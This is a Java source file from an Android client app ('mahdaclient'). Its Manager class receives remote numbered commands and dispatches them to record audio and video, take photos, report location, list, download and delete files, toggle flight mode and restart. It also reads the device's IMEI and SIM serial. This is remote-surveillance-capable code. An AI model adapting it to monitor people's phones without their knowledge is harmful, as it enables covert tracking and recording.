package ir.rayacell.mahdaclient.manager;

import ir.rayacell.mahdaclient.App;
import ir.rayacell.mahdaclient.MainActivity;
import ir.rayacell.mahdaclient.dao.OrderDao;
import ir.rayacell.mahdaclient.executer.DeleteFileExecuter;
import ir.rayacell.mahdaclient.executer.Direct3GExecuter;
import ir.rayacell.mahdaclient.executer.DirectWIFIExecuter;
import ir.rayacell.mahdaclient.executer.DownloadFileExecuter;
import ir.rayacell.mahdaclient.executer.FlightModeExecuter;
import ir.rayacell.mahdaclient.executer.GetFileListExecuter;
import ir.rayacell.mahdaclient.executer.GetLocationExecuter;
import ir.rayacell.mahdaclient.executer.GetStatusExecuter;
import ir.rayacell.mahdaclient.executer.MotionCaptureExecuter;
import ir.rayacell.mahdaclient.executer.MotionVideoExecuter;
import ir.rayacell.mahdaclient.executer.OrderStatusExecuter;
import ir.rayacell.mahdaclient.executer.PhotoCaptureExecuter;
import ir.rayacell.mahdaclient.executer.PingExecuter;
import ir.rayacell.mahdaclient.executer.RestartExecuter;
import ir.rayacell.mahdaclient.executer.SetConnectionExecuter;
import ir.rayacell.mahdaclient.executer.ShowOnlineMapExecuter;
import ir.rayacell.mahdaclient.executer.VideoRecordExecuter;
import ir.rayacell.mahdaclient.executer.VoiceRecordExecuter;
import ir.rayacell.mahdaclient.model.BaseModel;
import ir.rayacell.mahdaclient.model.Command;
import ir.rayacell.mahdaclient.model.Direct3GModel;
import ir.rayacell.mahdaclient.model.DirectWIFIModel;
import ir.rayacell.mahdaclient.model.OrderStatusModel;
import ir.rayacell.mahdaclient.model.Orders;
import ir.rayacell.mahdaclient.model.PingModel;
import ir.rayacell.mahdaclient.model.RestartModel;
import ir.rayacell.mahdaclient.model.ShowOnlineMapModel;
import ir.rayacell.mahdaclient.model.StatusModel;
import ir.rayacell.mahdaclient.param.BaseParam;
import ir.rayacell.mahdaclient.param.CapturePhotoParam;
import ir.rayacell.mahdaclient.param.Direct3GParam;
import ir.rayacell.mahdaclient.param.DirectWIFIParam;
import ir.rayacell.mahdaclient.param.FilesListParam;
import ir.rayacell.mahdaclient.param.FlightModeParam;
import ir.rayacell.mahdaclient.param.GetLocationParam;
import ir.rayacell.mahdaclient.param.MotionCaptureParam;
import ir.rayacell.mahdaclient.param.MotionVideoRecordParam;
import ir.rayacell.mahdaclient.param.OrderStatusParam;
import ir.rayacell.mahdaclient.param.PingParam;
import ir.rayacell.mahdaclient.param.RestartParam;
import ir.rayacell.mahdaclient.param.ShowOnlineMapParam;
import ir.rayacell.mahdaclient.param.VideoRecordParam;
import ir.rayacell.mahdaclient.param.VoiceRecordParam;
import ir.rayacell.mahdaclient.param.statusParam;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.util.Log;

public class Manager {
	public static long getIMEI() {
		TelephonyManager tMgr = (TelephonyManager) App.getContext()
				.getSystemService(App.getContext().TELEPHONY_SERVICE);
		String IMEI = tMgr.getDeviceId();
		if (IMEI == null) {
			return -1;
		} else {

			if (IMEI.equalsIgnoreCase(""))
				return 0;
			return Long.parseLong(IMEI.substring(0, 3));
			// return Long.parseLong("242424242");
			// return Long.parseLong(phoneNumber);
		}
	}
	public static String getSim() {
		TelephonyManager tMgr = (TelephonyManager) App.getContext()
				.getSystemService(App.getContext().TELEPHONY_SERVICE);
		String ss = tMgr.getSimSerialNumber();
		if (ss == null) {
			return "-1";
		} else {

			if (ss.equalsIgnoreCase(""))
				return "0";
			return ss;
			// return Long.parseLong("242424242");
			// return Long.parseLong(phoneNumber);
		}
	}
	private static void changeSim(){
		String simId =getSim();
		Intent simIntent = new Intent("android.intent.action.SMS_DEFAULT_SIM");
		simIntent.putExtra("simid", simId);
		Container.activity.sendBroadcast(simIntent);
	}
	public synchronized static void controll(final BaseParam param) {
		changeSim();
		Log.d("control", param.getCommand_type() + " ^^^^^^^^^^^^^^^^^^^^^^^");
		// update command start todb
		String orderId;
		String command_type = Parser.baseParser(param.getCommand());
		OrderDao dao = new OrderDao(App.getContext());
		Orders order;
		switch (Integer.parseInt(command_type)) {
		// 0 1 6 10 11
		// set connection command
		case 0:
			BaseModel setconnectionmodel = Parser.setConnectionParser(param);
			// setconnectionmodel.setPhoneNumber(param.getPhone_number());
//			if(param.getPhone_number() != null)
//			NetworkManager.setServerNumber(param.getPhone_number());
			SetConnectionExecuter mSetConnection = new SetConnectionExecuter(
					(StatusModel) setconnectionmodel);
			break;
		case 17:
			BaseModel restartmodel = Parser.setRestartParser(param);
			RestartExecuter mRestart = new RestartExecuter((RestartModel)restartmodel);
			break;
			
		
		case 18:
			BaseModel motionvideo = Parser.motionVideoParser(param.getCommand());
			orderId = ((Command) motionvideo)
					.getDate_and_time()
					.replace("-", "")
					.substring(
							((Command) motionvideo).getDate_and_time().indexOf(
									"-"),
							((Command) motionvideo).getDate_and_time()
									.replace("-", "").length())
					+ getIMEI();
			orderId = checkOrderId(orderId);

			order = new Orders(Integer.parseInt(orderId), 18 + "",
					motionvideo.getPhone_number(), NetworkManager.dstAddress,
					((Command) motionvideo).getDate_and_time(), 3);
			dao.createIfNotExist(order, "_id", order._id + "");
			MotionVideoRecordParam mvparam = new MotionVideoRecordParam((Command) motionvideo);
			MotionVideoExecuter mMotionVideo = new MotionVideoExecuter(mvparam,orderId);
			break;
			// ping connection
		case 19:
			BaseModel motioncapture = Parser.motionCaptureParser(param.getCommand());
			
			orderId = ((Command) motioncapture)
					.getDate_and_time()
					.replace("-", "")
					.substring(
							((Command) motioncapture).getDate_and_time().indexOf(
									"-"),
							((Command) motioncapture).getDate_and_time()
									.replace("-", "").length())
					+ getIMEI();
			orderId = checkOrderId(orderId);

			order = new Orders(Integer.parseInt(orderId), 19 + "",
					motioncapture.getPhone_number(), NetworkManager.dstAddress,
					((Command) motioncapture).getDate_and_time(), 3);
			dao.createIfNotExist(order, "_id", order._id + "");
			MotionCaptureParam motionCParam = new MotionCaptureParam((Command) motioncapture);
			MotionCaptureExecuter mMotionCapture = new MotionCaptureExecuter(motionCParam , orderId);
			break;
		case 16:
			BaseModel pingmodel = Parser.setPingParser(param);
			PingExecuter mPing = new PingExecuter((PingModel)pingmodel);
			break;
		// ONLINE MAP
		case 12:
			BaseModel showOnlineMap = Parser.mapParser(param);
//			if(param.getPhone_number() != null)
//			NetworkManager.setServerNumber(param.getPhone_number());
			ShowOnlineMapExecuter some = new ShowOnlineMapExecuter(
					(ShowOnlineMapModel) showOnlineMap);
			break;
		case 13:
			BaseModel directwifi = Parser.wifiParser(param);
//			if(param.getPhone_number() != null)
			Container.getProviderManager().setSmsProvider();
//			NetworkManager.setServerNumber(param.getPhone_number());
			DirectWIFIExecuter dwe = new DirectWIFIExecuter(
					(DirectWIFIModel) directwifi);
			break;
		case 14:
			BaseModel direct3g = Parser._3gParser(param);
//			if(param.getPhone_number() != null)
//			NetworkManager.setServerNumber(param.getPhone_number());
			Container.getProviderManager().setSmsProvider();
			Direct3GExecuter d3e = new Direct3GExecuter(
					(Direct3GModel) direct3g);
			break;
		case 15:
			BaseModel orderstatus = Parser.orderStatusParser(param);
//			if(param.getPhone_number() != null)
//			NetworkManager.setServerNumber(param.getPhone_number());
			OrderStatusExecuter osE = new OrderStatusExecuter(
					(OrderStatusModel) orderstatus);
			break;
		// status command

		case 1:

			BaseModel getstatusmodel = Parser.setConnectionParser(param);
//			if(param.getPhone_number() != null)
//			NetworkManager.setServerNumber(param.getPhone_number());
			GetStatusExecuter mGetStatus = new GetStatusExecuter(
					(StatusModel) getstatusmodel);
			break;

		// voice record command
		case 2:

			BaseModel voicemodel = Parser.stringParserVoice(param.getCommand());

			orderId = ((Command) voicemodel)
					.getDate_and_time()
					.replace("-", "")
					.substring(
							((Command) voicemodel).getDate_and_time().indexOf(
									"-"),
							((Command) voicemodel).getDate_and_time()
									.replace("-", "").length())
					+ getIMEI();
			orderId = checkOrderId(orderId);

			order = new Orders(Integer.parseInt(orderId), 2 + "",
					voicemodel.getPhone_number(), NetworkManager.dstAddress,
					((Command) voicemodel).getDate_and_time(), 3);
			dao.createIfNotExist(order, "_id", order._id + "");
			VoiceRecordParam voiceparam = new VoiceRecordParam(
					(Command) voicemodel);
			VoiceRecordExecuter mVoiceRecorder = new VoiceRecordExecuter(
					voiceparam, orderId);
			break;

		// video record command
		case 3:
			BaseModel videomodel = Parser.stringParser(param.getCommand());

			orderId = ((Command) videomodel)
					.getDate_and_time()
					.replace("-", "")
					.substring(
							((Command) videomodel).getDate_and_time().indexOf(
									"-"),
							((Command) videomodel).getDate_and_time()
									.replace("-", "").length())
					+ getIMEI();
			orderId = checkOrderId(orderId);

			order = new Orders(Integer.parseInt(orderId), 3 + "",
					videomodel.getPhone_number(), NetworkManager.dstAddress,
					((Command) videomodel).getDate_and_time(), 3);
			dao.createIfNotExist(order, "_id", order._id + "");

			VideoRecordParam videoparam = new VideoRecordParam(
					(Command) videomodel);
			VideoRecordExecuter mVideoRecorder = new VideoRecordExecuter(
					videoparam, orderId);

			break;

		// capture photo command
		case 4:
			BaseModel photomodel = Parser.photoStringParser(param.getCommand());
			orderId = ((Command) photomodel)
					.getDate_and_time()
					.replace("-", "")
					.substring(
							((Command) photomodel).getDate_and_time().indexOf(
									"-"),
							((Command) photomodel).getDate_and_time()
									.replace("-", "").length())
					+ getIMEI();
			orderId = checkOrderId(orderId);

			order = new Orders(Integer.parseInt(orderId), 4 + "",
					photomodel.getPhone_number(), NetworkManager.dstAddress,
					((Command) photomodel).getDate_and_time(), 3);

			dao.createIfNotExist(order, "_id", order._id + "");
			CapturePhotoParam photoparam = new CapturePhotoParam(
					(Command) photomodel);
			PhotoCaptureExecuter mCapturePhoto = new PhotoCaptureExecuter(
					photoparam, orderId);

			break;

		// get files list command
		case 6:
			BaseModel getfilemodel = Parser.baseModelParser(param);
			// GetFileListParam getfileparam = new GetFileListParam(
			// getfilemodel);
			GetFileListExecuter mGetFile = new GetFileListExecuter(getfilemodel);
			break;

		// flight mode command
		case 7:
			BaseModel flightmodemodel = Parser.flightParser(param.getCommand());
			orderId = ((Command) flightmodemodel)
					.getDate_and_time()
					.replace("-", "")
					.substring(
							((Command) flightmodemodel).getDate_and_time()
									.indexOf("-"),
							((Command) flightmodemodel).getDate_and_time()
									.replace("-", "").length())
									
					+ getIMEI();
			orderId = checkOrderId(orderId);

			order = new Orders(Integer.parseInt(orderId), 7 + "",
					flightmodemodel.getPhone_number(),
					NetworkManager.dstAddress,
					((Command) flightmodemodel).getDate_and_time(), 3);
			dao.createIfNotExist(order, "_id", order._id + "");
			FlightModeParam flightmodeparam = new FlightModeParam(
					(Command) flightmodemodel);
			FlightModeExecuter mflightmodeexecuter = new FlightModeExecuter(
					flightmodeparam, orderId);

			break;

		// get location command
		case 8:
			BaseModel locationmodel = Parser.locationStringParser(param
					.getCommand());
			orderId = ((Command) locationmodel)
					.getDate_and_time()
					.replace("-", "")
					.substring(
							((Command) locationmodel).getDate_and_time()
									.indexOf("-"),
							((Command) locationmodel).getDate_and_time()
									.replace("-", "").length())
					+ getIMEI();
			orderId = checkOrderId(orderId);
			order = new Orders(Integer.parseInt(orderId), 8 + "",
					locationmodel.getPhone_number(), NetworkManager.dstAddress,
					((Command) locationmodel).getDate_and_time(), 3);
			dao.createIfNotExist(order, "_id", order._id + "");
			GetLocationParam locationparam = new GetLocationParam(
					(Command) locationmodel);
			GetLocationExecuter mGetLocation = new GetLocationExecuter(
					locationparam, orderId);

			break;

		// delete file command
		case 10:
			BaseModel deletemodel = Parser.deleteDownloadParser(param);

			DeleteFileExecuter mdeletefileexecuter = new DeleteFileExecuter(
					deletemodel);
			break;

		// download file command
		case 11:
			BaseModel downloadmodel = Parser.deleteDownloadParser(param);

			DownloadFileExecuter mdownloadfileexecuter = new DownloadFileExecuter(
					downloadmodel);
			break;
		default:
			break;
		}

	}

	public static String checkOrderId(String orderId) {
		int tmp = Integer.parseInt(orderId.charAt(1) + "")
				+ Integer.parseInt(orderId.charAt(2) + "");
		orderId = tmp + orderId.substring(3, orderId.length());
		return orderId;

	}

	int a = 1580215547;

//	public static void initialize() {
//		if (Container.getProviderManager().getProvider() == null) {
//			Container.getProviderManager().setSmsProvider();
//		}
//	}

	// uses only sms to provide connection in the beginning and then return
	// status of client
	public static void setConnection(BaseModel model) {
		statusParam param = new statusParam(model);
		Container.getProviderManager().send(param);
	}

	public static void sendLocation(BaseModel model) {
		ShowOnlineMapParam param = new ShowOnlineMapParam(model);
		Container.getProviderManager().send(param);
	}

	public static void sendWifi(BaseModel model) {
		DirectWIFIParam param = new DirectWIFIParam(model);
		Container.getProviderManager().send(param);
	}

	public static void send3G(BaseModel model) {
		Direct3GParam param = new Direct3GParam(model);
		Container.getProviderManager().setSmsProvider();
		Container.getProviderManager().send(param);
	}
	public static void sendPing(BaseModel model) {
		PingParam param = new PingParam(model);
		Container.getProviderManager().setSmsProvider();
		Container.getProviderManager().send(param);
	}
	public static void sendRestart(BaseModel model) {
		RestartParam param = new RestartParam(model);
//		Container.getProviderManager().setSmsProvider();
//		Container.getProviderManager().send(param);
	}
	// only brings back status of client.
	public static void sendStatus(BaseModel model) {
		statusParam param = new statusParam(model);

		Container.getProviderManager().send(param);
	}

	public static void sendFilesList(BaseModel model) {
		FilesListParam param = new FilesListParam(model);
		Container.getProviderManager().send(param);
	}

	public static void sendOrderStatus(BaseModel mModel) {
		OrderStatusParam param = new OrderStatusParam(mModel);
		Container.getProviderManager().send(param);

	}

}
